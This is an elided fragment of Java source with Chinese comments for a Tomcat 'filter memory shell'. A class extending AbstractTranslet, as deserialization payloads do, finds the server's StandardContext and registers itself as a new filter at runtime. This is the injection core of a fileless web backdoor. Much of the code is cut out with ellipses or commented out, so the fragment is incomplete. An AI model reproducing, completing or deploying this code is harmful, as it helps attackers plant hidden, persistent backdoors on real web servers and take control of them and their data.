...
public class TomcatFilterMemShellFromThread extends AbstractTranslet implements Filter {
    static {
        try {
            ...
            // 线程循环寻找StandardContext对象
//            Thread thread = Thread.currentThread();
//            while (thread != null) {
//                if (thread.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
//                    StandardContext standardContext = (StandardContext) thread;
//                    // 创建FilterDef对象
//                    FilterDef filterDef = new FilterDef();
//                    filterDef.setFilterName(name);
//                    filterDef.setFilterClass(TomcatFilterMemShellFromThread.class.getName());
//                    filterDef.setAsyncSupported("true");
//                    // 创建FilterMap对象
//                    FilterMap filterMap = new FilterMap();
//                    filterMap.setFilterName(name);
//                    filterMap.setURLPattern(URLPattern);
//                    // 将FilterDef和FilterMap添加到StandardContext的filterMap中
...
//        }
            ...
            /**
             * 将filterDef添加到filterDefs中 不能直接添加到filterConfigs中，因为filterConfigs是一个线程安全的map
             */
            standardContext.addFilterDef(filterDef);
